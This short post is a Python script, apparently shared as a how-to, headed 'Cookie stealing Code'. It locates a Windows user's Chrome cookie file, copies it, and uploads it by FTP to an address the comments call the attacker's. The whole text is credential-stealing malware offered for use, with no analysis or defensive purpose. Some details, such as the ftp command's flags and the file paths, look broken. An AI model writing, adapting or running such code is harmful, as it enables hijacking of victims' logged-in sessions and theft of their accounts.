✨Cookie stealing Code (Python Script)✨

import os
import shutil
import getpass
import subprocess

#Step 1: Find the user
user = getpass.getuser()
#Step 2: Finding Chrome Cookies
#Location of Chrome Cookies
chrome_cookies_location = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"

#Step 3: Copy the Cookies
if os.path.exists(chrome_cookies_location):
  shutil.copy(chrome_cookies_location,"C:\\Host\\")

#Step 4: Send the Cookies to the Attacker
subprocess.call('ftp 192.168.1.0 --user username --password pass --put Cookies')
